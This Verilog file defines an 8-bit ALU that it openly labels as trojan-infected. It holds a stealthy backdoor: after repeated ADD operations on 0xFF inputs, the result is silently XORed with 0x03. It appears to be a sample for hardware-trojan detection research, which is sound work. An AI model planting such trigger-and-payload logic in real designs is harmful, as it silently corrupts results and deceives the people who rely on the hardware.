// 8-bit Arithmetic Logic Unit (Trojan-Infected Design)
// Contains a stealthy hardware backdoor with rare trigger condition
// Trigger: A == 0xFF AND B == 0xFF (1/65536 probability)

module alu_8bit_trojan (
    input  [7:0] A,
    input  [7:0] B,
    input  [1:0] op,
    input        clk,
    output reg [7:0] result,
    output reg carry,
    output reg zero,
    output reg overflow
);

    // Operation codes
    localparam OP_ADD = 2'b00;
    localparam OP_SUB = 2'b01;
    localparam OP_AND = 2'b10;
    localparam OP_OR  = 2'b11;

    // Trojan components - these create side-channel signatures
    reg trojan_trigger;       // Detects trigger condition
    reg trojan_active;        // Activation state
    reg [3:0] trigger_counter; // 4-bit state counter
    reg [7:0] payload_mask;   // Payload control logic
    
    // Internal computation
    reg [8:0] temp_result;
    reg [7:0] normal_result;
    
    // Trojan trigger detection
    always @(posedge clk) begin
        trojan_trigger = (A == 8'hFF) && (B == 8'hFF) && (op == OP_ADD);
        
        if (trojan_trigger) begin
            if (trigger_counter < 4'd7)
                trigger_counter = trigger_counter + 1;
            else
                trojan_active = 1'b1;
        end else begin
            trigger_counter = 4'd0;
            trojan_active = 1'b0;
        end
        
        payload_mask = trojan_active ? 8'h03 : 8'h00;
    end
    
    // Normal ALU operations
    always @(posedge clk) begin
        case (op)
            OP_ADD: begin
                temp_result = A + B;
                normal_result = temp_result[7:0];
                carry = temp_result[8];
                overflow = (A[7] == B[7]) && (normal_result[7] != A[7]);
            end
            
            OP_SUB: begin
                temp_result = A - B;
                normal_result = temp_result[7:0];
                carry = temp_result[8];
                overflow = (A[7] != B[7]) && (normal_result[7] != A[7]);
            end
            
            OP_AND: begin
                normal_result = A & B;
                carry = 1'b0;
                overflow = 1'b0;
            end
            
            OP_OR: begin
                normal_result = A | B;
                carry = 1'b0;
                overflow = 1'b0;
            end
            
            default: begin
                normal_result = 8'b0;
                carry = 1'b0;
                overflow = 1'b0;
            end
        endcase
        
        // Trojan payload - XOR with mask when active
        result = normal_result ^ payload_mask;
        zero = (result == 8'b0);
    end

endmodule
